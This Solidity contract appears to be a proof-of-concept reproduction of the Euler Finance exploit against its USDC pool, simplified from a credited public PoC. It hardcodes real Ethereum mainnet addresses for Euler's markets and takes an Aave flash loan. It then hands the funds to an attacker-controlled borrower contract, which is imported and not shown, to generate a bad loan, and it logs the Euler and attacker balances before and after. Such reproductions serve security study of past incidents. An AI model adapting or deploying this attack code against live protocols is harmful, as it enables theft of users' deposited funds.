pragma solidity ^0.8.0;

import "forge-std/interfaces/IERC20.sol";
import "forge-std/console2.sol";

import "../src/flashloan/FlashLoan.sol";
import { EthereumTokens } from "../src/tokens/Tokens.sol";

import "./interfaces/IEToken.sol";
import "./interfaces/IDToken.sol";
import "./interfaces/ILiquidation.sol";
import "./BadBorrower.sol";

// Euler Markets on Ethereum
// Source: https://docs.euler.finance/euler-protocol/addresses
library EulerProtocol {

    IEToken public constant eUSDC = IEToken(0xEb91861f8A4e1C12333F42DCE8fB0Ecdc28dA716);
    IDToken public constant dUSDC = IDToken(0x84721A3dB22EB852233AEAE74f9bC8477F8bcc42);

    ILiquidation public constant liquidation = ILiquidation(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34);
    address public constant euler = 0x27182842E098f60e3D576794A5bFFb0777E025d3;

}

/**
 * @title   EulerHackUSDC
 * @notice  This is a simplified version of the original PoC by @iphelix available at https://github.com/iphelix/euler-exploit-poc.
 *          This version only focuses on the USDC pool.
 */
contract EulerHackUSDC is FlashLoan {

    BadBorrower badBorrower;

    uint256 x;
    uint256 flashAmount;
    uint256 mintAmount;
    uint256 donateAmount;
    IERC20 usdc;
    IEToken eToken;
    IDToken dToken;

    function initiateAttack() external {

        FlashLoanProviders provider;

        x = 70_000_000; // hardcoded value

        usdc = EthereumTokens.USDC;
        eToken = EulerProtocol.eUSDC;
        dToken = EulerProtocol.dUSDC;
        provider = FlashLoanProviders.AAVEV2;
 
        // Calculate attack parameters

        flashAmount = x * 3;
        mintAmount = x * 2 * 10;
        donateAmount = x * 10;

        console.log("[*] Euler balance before exploit: %d USDC", usdc.balanceOf(EulerProtocol.euler) / 10**6);
        console.log("[*] Attacker balance before exploit: %d USDC", usdc.balanceOf(address(this)) / 10**6);

        // Initiate the flashloan of USDC
        console.log("[*] Borrowing %d USDC", flashAmount);

        // Attack happens during flashloan callback
        takeFlashLoan(provider, address(usdc), flashAmount * 10**6);
        
        console.log("[*] Euler balance after exploit: %d USDC", usdc.balanceOf(EulerProtocol.euler) / 10**6);
        console.log("[*] Attacker balance after exploit: %d USDC", usdc.balanceOf(address(this)) / 10**6);
    }

    function _executeAttack() internal override {
        
        // Deploy attacker-controlled borrower contract
        badBorrower = new BadBorrower();

        // Transfer all flashloaned USDC to the attacker-controlled contract
        // that is going to generate the bad position
        usdc.transfer(address(badBorrower), flashAmount * 10**6);

        // Pass execution to the borrower
        badBorrower.generateBadLoan({
            coordinator: address(this),
            initialBalance: flashAmount,
            mintAmount: mintAmount,
            donateAmount: donateAmount
        });
    }

    function _completeAttack() internal override { }

    receive() payable external {}
}
